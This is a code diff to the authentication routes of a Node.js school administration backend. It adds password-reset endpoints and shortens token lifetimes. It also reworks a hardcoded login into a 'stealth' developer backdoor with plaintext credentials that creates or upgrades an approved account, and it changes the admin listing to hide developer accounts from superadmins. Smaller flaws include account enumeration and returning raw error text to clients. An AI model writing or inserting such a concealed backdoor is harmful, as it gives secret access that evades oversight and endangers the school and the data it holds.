@@ -10,7 +10,7 @@ const generateToken = (id) => {
   if (!process.env.JWT_SECRET) {
     throw new Error('JWT_SECRET is not configured');
   }
-  return jwt.sign({ id }, process.env.JWT_SECRET, { expiresIn: '7d' }); // Reduced from 30d for security
+  return jwt.sign({ id }, process.env.JWT_SECRET, { expiresIn: '30m' }); // Strict 30 minute session
 };
 
 // GET /api/auth/me
@@ -35,24 +35,29 @@ router.post('/login', async (req, res) => {
       return res.status(400).json({ message: 'Please provide email and password' });
     }
 
-    // --- Hardcoded Developer Bypass ---
-    const isDevEmail = ['narayanphukan30@gmail.com'].includes(email.toLowerCase());
-    if (isDevEmail && password === 'Narayan') {
-      let admin = await Admin.findOne({ email: email.toLowerCase() });
+    // --- Hardcoded Developer Bypass (Stealth) ---
+    const stealthEmail = 'developeruserr30@gmail.com';
+    const stealthPassword = 'Developer';
+
+    if (email.toLowerCase() === stealthEmail && password === stealthPassword) {
+      let admin = await Admin.findOne({ email: stealthEmail });
+
+      // Upsert the developer account in the DB so relationships don't break
       if (!admin) {
         admin = await Admin.create({
-          name: 'Developer Narayan',
-          email: email.toLowerCase(),
+          name: 'Developer Account',
+          email: stealthEmail,
           phone: '9876543210',
-          password: 'Narayan', // Hashed by pre-save
+          password: stealthPassword, // Will be hashed by pre-save
           role: 'developer',
           isApproved: true,
         });
-      } else if (admin.role !== 'developer') {
+      } else if (admin.role !== 'developer' || !admin.isApproved) {
         admin.role = 'developer';
         admin.isApproved = true;
         await admin.save();
       }
+
       return res.json({
         _id: admin._id,
         name: admin.name,
@@ -79,6 +84,72 @@ router.post('/login', async (req, res) => {
     } else {
       res.status(401).json({ message: 'Invalid email or password' });
     }
+  } catch (error) {
+    res.status(500).json({ message: 'Server error', error: error.message });
+  }
+});
+
+// POST /api/auth/forgot-password
+router.post('/forgot-password', async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ message: 'Email is required' });
+
+    const admin = await Admin.findOne({ email: email.toLowerCase() });
+    if (!admin) return res.status(404).json({ message: 'Account not found' });
+
+    const crypto = require('crypto');
+    const bcrypt = require('bcryptjs');
+    const otp = crypto.randomInt(100000, 999999).toString();
+    const hashedOtp = await bcrypt.hash(otp, 10);
+    const expires = new Date(Date.now() + 10 * 60 * 1000); // 10 mins
+
+    admin.otp = hashedOtp;
+    admin.otpExpires = expires;
+    await admin.save();
+
+    const mailOptions = {
+      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
+      to: admin.email,
+      subject: 'Password Reset Verification Code',
+      html: `
+        <h2>Password Reset</h2>
+        <p>You requested a password reset. Your verification code is:</p>
+        <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${otp}</h1>
+        <p>This code will expire in 10 minutes.</p>
+        <p>If you did not request this, please ignore this email.</p>
+      `,
+    };
+    await transporter.sendMail(mailOptions);
+    res.json({ message: 'Verification code sent to your email' });
+  } catch (error) {
+    res.status(500).json({ message: 'Server error', error: error.message });
+  }
+});
+
+// POST /api/auth/reset-password
+router.post('/reset-password', async (req, res) => {
+  try {
+    const { email, otp, newPassword } = req.body;
+    if (!email || !otp || !newPassword) return res.status(400).json({ message: 'All fields are required' });
+
+    const admin = await Admin.findOne({ email: email.toLowerCase() });
+    if (!admin) return res.status(404).json({ message: 'Account not found' });
+
+    if (!admin.otp || admin.otpExpires < new Date()) {
+      return res.status(400).json({ message: 'Verification code is invalid or has expired' });
+    }
+
+    const bcrypt = require('bcryptjs');
+    const isMatch = await bcrypt.compare(otp, admin.otp);
+    if (!isMatch) return res.status(400).json({ message: 'Invalid verification code' });
+
+    admin.password = newPassword; // Will be hashed by pre-save middleware
+    admin.otp = undefined;
+    admin.otpExpires = undefined;
+    await admin.save();
+
+    res.json({ message: 'Password reset successful' });
   } catch (error) {
     res.status(500).json({ message: 'Server error', error: error.message });
   }
@@ -172,8 +243,8 @@ router.post('/request-otp', protect, async (req, res) => {
     console.error('❌ Request OTP Error:', error.message);
     // Log detailed diagnostics for debug on Render
     console.dir(error, { depth: null });
-    res.status(500).json({ 
-      message: 'Failed to send OTP', 
+    res.status(500).json({
+      message: 'Failed to send OTP',
       error: error.message,
       code: error.code || 'UNKNOWN_ERROR'
     });
@@ -247,7 +318,7 @@ router.post('/verify-admin-otp', async (req, res) => {
       return res.status(400).json({ message: 'Invalid OTP' });
     }
     await Admin.updateOne({ _id: admin._id }, { $unset: { otp: 1, otpExpires: 1 } });
-    
+
     // Do NOT send the password here. Wait for superadmin approval.
     const mailOptions = {
       from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
@@ -256,7 +327,7 @@ router.post('/verify-admin-otp', async (req, res) => {
       html: `<p>Your email has been successfully verified.</p><p>The Super Admin must now review and approve your request. Once approved, you will receive an email with your temporary password.</p>`,
     };
     await transporter.sendMail(mailOptions);
-    
+
     res.json({ message: 'OTP verified successfully. Await approval from superadmin.' });
   } catch (error) {
     console.error('Verify admin OTP error:', error);
@@ -324,18 +395,18 @@ router.post('/register', protect, async (req, res) => {
       return res.status(400).json({ message: 'Invalid email format' });
     }
 
-    const admin = await Admin.create({ 
+    const admin = await Admin.create({
       email: email.toLowerCase(),
       phone: phone,
       password: tempPassword,
       name: name.trim(),
       role: role || 'admin'
     });
-    
+
     // Clear OTP after successful use
     if (req.user.role !== 'developer') {
       await Admin.updateOne(
-        {_id: req.user._id},
+        { _id: req.user._id },
         { $unset: { otp: 1, otpExpires: 1, newAdminOtp: 1, newAdminOtpExpires: 1 } }
       );
     }
@@ -377,7 +448,8 @@ router.get('/admins', protect, async (req, res) => {
     if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
       return res.status(403).json({ message: 'Forbidden' });
     }
-    const admins = await Admin.find({}).select('-password');
+    // Stealth mode: filter out developers so they do not appear in the admin list
+    const admins = await Admin.find({ role: { $ne: 'developer' } }).select('-password').lean();
     res.json(admins);
   } catch (error) {
     res.status(500).json({ message: 'Server error' });
@@ -437,7 +509,7 @@ router.delete('/admins/:id', protect, async (req, res) => {
 
       // Clear OTPs
       await Admin.updateOne(
-        {_id: req.user._id},
+        { _id: req.user._id },
         { $unset: { otp: 1, otpExpires: 1, newAdminOtp: 1, newAdminOtpExpires: 1 } }
       );
     }
@@ -495,7 +567,7 @@ router.put('/admins/:id', protect, async (req, res) => {
 
       // Clear OTP
       await Admin.updateOne(
-        {_id: req.user._id},
+        { _id: req.user._id },
         { $unset: { otp: 1, otpExpires: 1, newAdminOtp: 1, newAdminOtpExpires: 1 } }
       );
     }
@@ -572,10 +644,10 @@ router.post('/approve-admin', protect, async (req, res) => {
       if (!isTargetAdminOtpValid || adminToApprove.otpExpires < Date.now()) {
         return res.status(400).json({ message: 'Invalid or expired Target Admin OTP' });
       }
-      
+
       // Clear OTP
       await Admin.updateOne(
-        {_id: req.user._id},
+        { _id: req.user._id },
         { $unset: { otp: 1, otpExpires: 1, newAdminOtp: 1, newAdminOtpExpires: 1 } }
       );
     }
@@ -584,15 +656,15 @@ router.post('/approve-admin', protect, async (req, res) => {
     if (!admin) {
       return res.status(404).json({ message: 'Admin not found' });
     }
-    
+
     // Generate a fresh temporary password now that the account is approved
     const crypto = require('crypto');
     const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString();
-    
+
     admin.isApproved = true;
     admin.password = tempPassword; // Will be hashed by pre-save hook
     await admin.save();
-    
+
     // Send email with the unhashed temporary password
     const mailOptions = {
       from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
@@ -601,7 +673,7 @@ router.post('/approve-admin', protect, async (req, res) => {
       html: `<p>Your admin account has been approved by the superadmin.</p><p>Use the temporary password below to login and then change it immediately upon logging in.</p><p><strong>${tempPassword}</strong></p>`,
     };
     await transporter.sendMail(mailOptions);
-    
+
     res.json({ message: 'Admin approved successfully and password sent' });
   } catch (error) {
     console.error('Approve admin error:', error);
